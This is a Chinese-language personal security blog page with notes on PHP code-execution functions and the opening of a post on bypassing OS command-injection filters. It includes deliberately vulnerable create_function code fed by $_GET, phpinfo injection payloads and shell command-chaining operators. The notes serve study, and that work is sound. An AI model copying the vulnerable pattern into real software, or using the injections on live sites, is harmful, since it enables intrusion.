<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"h01iday.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="https://h01iday.github.io/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="H01iday">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://h01iday.github.io/page/2/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"en","comments":"","permalink":"","path":"page/2/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>Hexo</title>
  




  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar" role="button">
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">Hexo</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>







</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-overview">
            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">H01iday</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">32</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



          </div>
        </div>
      </div>
    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/09/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/09/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-10-09 21:40:45" itemprop="dateCreated datePublished" datetime="2021-10-09T21:40:45+08:00">2021-10-09</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-10 16:06:57" itemprop="dateModified" datetime="2021-10-10T16:06:57+08:00">2021-10-10</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="01-eval"><a href="#01-eval" class="headerlink" title="01.eval"></a>01.eval</h1><p><strong>eval(String $code)</strong></p>
<p>把<strong>字符串$code</strong>作为php代码执行</p>
<p><img src="D:\blog\H01iday\source_posts\pics\ec1.png" alt="ec1"></p>
<h1 id="02-assert"><a href="#02-assert" class="headerlink" title="02.assert"></a>02.assert</h1><p>assert — 检查一个断言是否为 **<code>false</code>**，如果是false，则根据 assert_options 的设置进行一些操作</p>
<p><strong>PHP5： assert(mixed <code>$assertion</code>, string <code>$description</code> = ?)</strong></p>
<p><strong>PHP 7：assert mixed <code>$assertion</code>, Throwable <code>$exception</code> = ?)</strong></p>
<p>[mixed指的是任何类型都可以]</p>
<p>如果 <code>assertion</code> 是字符串，它将会被 <strong>assert()</strong> 当做 PHP 代码来执行。</p>
<p><strong>assert()</strong> 的行为可以通过 assert_options($signal, $value) 来配置</p>
<table>
<thead>
<tr>
<th align="left">标志</th>
<th align="left">INI 设置</th>
<th align="left">默认值</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ASSERT_ACTIVE</td>
<td align="left">assert.active</td>
<td align="left">1</td>
<td align="left">启用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.assert.php">assert()</a> 断言</td>
</tr>
<tr>
<td align="left">ASSERT_WARNING</td>
<td align="left">assert.warning</td>
<td align="left">1</td>
<td align="left">为每个失败的断言产生一个 PHP 警告（warning）</td>
</tr>
<tr>
<td align="left">ASSERT_BAIL</td>
<td align="left">assert.bail</td>
<td align="left">0</td>
<td align="left">在断言失败时中止执行</td>
</tr>
<tr>
<td align="left">ASSERT_QUIET_EVAL</td>
<td align="left">assert.quiet_eval</td>
<td align="left">0</td>
<td align="left">在断言表达式求值时禁用 error_reporting</td>
</tr>
<tr>
<td align="left">ASSERT_CALLBACK</td>
<td align="left">assert.callback</td>
<td align="left">(null)有则为对应函数</td>
<td align="left">断言失败时调用回调函数</td>
</tr>
</tbody></table>
<p><img src="D:\blog\H01iday\source_posts\pics\ec2.png" alt="ec2"></p>
<h1 id="03call-user-func"><a href="#03call-user-func" class="headerlink" title="03call_user_func"></a>03call_user_func</h1><p><strong>call_user_func(callable<code>$callback</code>, mixed <code>$parameter</code> = ?, mixed<code>$...</code> = ?)</strong></p>
<p>callable的函数有哪些？</p>
<p>PHP是将函数以string形式传递的。 </p>
<p>可以使用任何内置或用户自定义函数</p>
<p>==<strong>但除了语言结构例如：array()，echo，empty()，eval()，exit()，isset()，list()，print 或 unset()。</strong>==</p>
<p>$callback为被调用的回调函数</p>
<p>其余参数为$callback函数的参数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">barber</span>(<span class="params"><span class="variable">$type</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You wanted a <span class="subst">$type</span> haircut, no problem\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(<span class="string">&#x27;barber&#x27;</span>, <span class="string">&quot;mushroom&quot;</span>);<span class="comment">//output:You wanted a mushroom haircut, no problem</span></span><br><span class="line">call_user_func(<span class="string">&#x27;barber&#x27;</span>, <span class="string">&quot;shave&quot;</span>);<span class="comment">//output:You wanted a shave haircut, no problem</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\ec3.png" alt="ec3"></p>
<h1 id="04call-user-func-array"><a href="#04call-user-func-array" class="headerlink" title="04call_user_func_array"></a>04call_user_func_array</h1><p><strong>call_user_func_array(callable <code>$callback</code>, array <code>$param_arr</code>)</strong></p>
<p>$callback为被调用的回调函数</p>
<p>$param_arr为参数数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foobar</span>(<span class="params"><span class="variable">$arg</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">__FUNCTION__</span>, <span class="string">&quot; got <span class="subst">$arg</span> and <span class="subst">$arg2</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Call the foobar() function with 2 arguments</span></span><br><span class="line">call_user_func_array(<span class="string">&quot;foobar&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;one&quot;</span>, <span class="string">&quot;two&quot;</span>));<span class="comment">//output:foobar got one and two</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h1 id="05create-function"><a href="#05create-function" class="headerlink" title="05create_function"></a>05create_function</h1><p>Create an anonymous function</p>
<p><strong>create_function(string <code>$args</code>, string <code>$code</code>)</strong></p>
<p>通过$args参数，和code创建一个匿名函数。</p>
<p>返回值：unique function name as a string, or <strong><code>false</code></strong> on error.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="variable">$newfun</span> = create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;return &quot;I Love $a&quot;;&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;newfunc:<span class="subst">$newfun</span>&quot;</span>;<span class="comment">//output:   newfunc:lambda_1【这是任意给的函数名】</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$newfun</span>(<span class="string">&quot;apple&quot;</span>);<span class="comment">//output:I Love apple</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span>=<span class="string">&#x27;echo&#x27;</span>.<span class="variable">$para</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    create_function(<span class="string">&#x27;$para&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">==========================将虚拟函数转化为===================</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span>=<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$para</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"><span class="variable">$para</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$para</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> 如果将id设为：<span class="number">1</span>;&#125;phpinfo();<span class="comment">/*</span></span><br><span class="line"><span class="comment">=========================分割线=============================*/</span>[为了下面美观，我这里手动闭合一下]</span><br><span class="line"> 那么代码将变为</span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span>=<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$para</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    create_function(<span class="string">&#x27;$para&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"><span class="variable">$para</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$para</span>.<span class="string">&#x27;test&#x27;</span><span class="number">.1</span>;&#125;phpinfo();<span class="comment">/*.&#x27;.&#x27;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"> ?&gt;</span></span><br><span class="line"><span class="comment"> =====================整理一下==============================*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$code</span>=<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$para</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">    create_function(<span class="string">&#x27;$para&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"><span class="variable">$para</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$para</span>.<span class="string">&#x27;test&#x27;</span><span class="number">.1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	phpinfo();<span class="comment">/*后面的内容不管是什么都被注释掉了</span></span><br><span class="line"><span class="comment">	.&#x27;.&#x27;;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"> ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>再举一个栗子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$lambda</span>=create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&quot;return (strlen(<span class="subst">$a</span>)-strlen(<span class="subst">$b</span>)+&quot;</span> . <span class="string">&quot;strlen(<span class="subst">$c</span>));&quot;</span>);</span><br><span class="line">    <span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;reall long string here,boy&#x27;</span>,<span class="string">&#x27;this&#x27;</span>,<span class="string">&#x27;midding lenth&#x27;</span>,<span class="string">&#x27;larget&#x27;</span>);</span><br><span class="line">    usort(<span class="variable">$array</span>,<span class="variable">$lambda</span>);</span><br><span class="line">    print_r(<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">注入【?c=<span class="number">1</span>));&#125;phpinfo();<span class="comment">/*】</span></span><br><span class="line"><span class="comment">========================这里的$c其实作用就是，提供一个注入口，因为它从GET来。 下面分析==========================</span></span><br><span class="line"><span class="comment">$lambda=create_function(&#x27;$a,$b&#x27;,&quot;return (strlen($a)-strlen($b)+&quot; . &quot;strlen(1));&#125;phpinfo();/*));&quot;);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">======*/</span>美观匿名函数实际</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (strlen(<span class="variable">$a</span>)-strlen(<span class="variable">$b</span>)+<span class="string">&quot; . &quot;</span>strlen(<span class="number">1</span>));&#125;phpinfo();<span class="comment">/*));</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> ===*/</span>美观</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (strlen(<span class="variable">$a</span>)-strlen(<span class="variable">$b</span>)+<span class="string">&quot; . &quot;</span>strlen(<span class="number">1</span>));</span><br><span class="line"> &#125;</span><br><span class="line">	phpinfo();<span class="comment">/*));后面的内容都被注释掉了</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br></pre></td></tr></table></figure>



<h1 id="06array-map"><a href="#06array-map" class="headerlink" title="06array_map"></a>06array_map</h1><p> 为数组的每个元素应用回调函数</p>
<p><strong>array_map(callable $callback, array $array, array …$arrays)</strong></p>
<p>返回数组，是为 <code>array</code> 每个元素应用 <code>callback</code>函数之后的数组。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cube</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$n</span> * <span class="variable">$n</span> * <span class="variable">$n</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="variable">$b</span> = array_map(<span class="string">&#x27;cube&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line">print_r(<span class="variable">$b</span>);<span class="comment">//output:Array ( [0] =&gt; 1 [1] =&gt; 8 [2] =&gt; 27 [3] =&gt; 64 [4] =&gt; 125 )</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\ec4.png" alt="ec4"></p>
<h1 id="07preg-replace"><a href="#07preg-replace" class="headerlink" title="07preg_replace"></a>07preg_replace</h1><p>preg_replace — 执行一个正则表达式的搜索和替换</p>
<p>搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分，以 <code>replacement</code> 进行替换。</p>
<p>preg_replace(<br>    string|array $pattern,<br>    string|array $replacement,<br>    string|array $subject,<br>    int $limit = -1,<br>    int &amp;$count = null<br>)</p>
<p>limit<br>每个模式在每个 subject 上进行替换的最大次数。默认是 -1(无限)。</p>
<p>count<br>如果指定，将会被填充为完成的替换次数。//替换完得到count的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;The quick brown fox jumps over the lazy dog.&#x27;</span>;</span><br><span class="line"><span class="variable">$patterns</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$patterns</span>[<span class="number">0</span>] = <span class="string">&#x27;/quick/&#x27;</span>;</span><br><span class="line"><span class="variable">$patterns</span>[<span class="number">1</span>] = <span class="string">&#x27;/brown/&#x27;</span>;</span><br><span class="line"><span class="variable">$patterns</span>[<span class="number">2</span>] = <span class="string">&#x27;/fox/&#x27;</span>;</span><br><span class="line"><span class="variable">$replacements</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$replacements</span>[<span class="number">0</span>] = <span class="string">&#x27;slow&#x27;</span>;</span><br><span class="line"><span class="variable">$replacements</span>[<span class="number">1</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line"><span class="variable">$replacements</span>[<span class="number">2</span>] = <span class="string">&#x27;bear&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="variable">$patterns</span>, <span class="variable">$replacements</span>, <span class="variable">$string</span>);<span class="comment">//output:The slow black bear jumps over the lazy dog.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<p>正则表达式中的/e模式的作用是将替换串中的内容当作代码来执行，/e模式是php语言才有的【/e对高版本php已不适用】</p>
<img src="D:\blog\H01iday\source\_posts\pics\ec5.png" alt="ec5" style="zoom:67%;" />

<h1 id="08可变函数"><a href="#08可变函数" class="headerlink" title="08可变函数"></a>08可变函数</h1><p>意味着如果一个<strong>变量名</strong>【即$xxx】后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。</p>
<p>可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;In foo()&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"><span class="variable">$arg</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;In bar(); argument was &#x27;<span class="subst">$arg</span>&#x27;.&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 echo 的包装函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoit</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span>();        <span class="comment">//output: In foo()</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span>(<span class="string">&#x27;test&#x27;</span>);  <span class="comment">//output: In bar(); argument was &#x27;test&#x27;.</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span> = <span class="string">&#x27;echoit&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span>(<span class="string">&#x27;test&#x27;</span>);  <span class="comment">//output: test</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\ec6.png" alt="ec6"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/09/(OS%20command%20injection)%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/09/(OS%20command%20injection)%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2021-10-09 17:11:59 / Modified: 21:40:14" itemprop="dateCreated datePublished" datetime="2021-10-09T17:11:59+08:00">2021-10-09</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="命令执行漏洞各种绕过方式"><a href="#命令执行漏洞各种绕过方式" class="headerlink" title="命令执行漏洞各种绕过方式"></a>命令执行漏洞各种绕过方式</h1><p><strong>这是指php命令执行</strong></p>
<p>命令执行漏洞指攻击者可以随意执行系统命令，php中提供了部分函数用来执行外部应用程序，如system()、shell_exec()、exec()、passthru()。通过这些函数可以直接执行系统命令。</p>
<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h3 id="windows中常见的管道符"><a href="#windows中常见的管道符" class="headerlink" title="windows中常见的管道符"></a>windows中常见的管道符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A|B			直接执行B</span><br><span class="line">A||B		A假执行B，否则只执行A</span><br><span class="line">A&amp;B			AB都要执行，不论真假</span><br><span class="line">A&amp;&amp;B		A假B不执行，A真AB都执行</span><br></pre></td></tr></table></figure>

<p><img src="D:\blog\H01iday\source_posts\pics\exec1.png" alt="exec1"></p>
<h3 id="linux中常见的管道符"><a href="#linux中常见的管道符" class="headerlink" title="linux中常见的管道符"></a>linux中常见的管道符</h3><p>window中的都适用，再增加一种：<code>A;B</code></p>
<p>A和B都要执行，在A执行完之后B执行；</p>
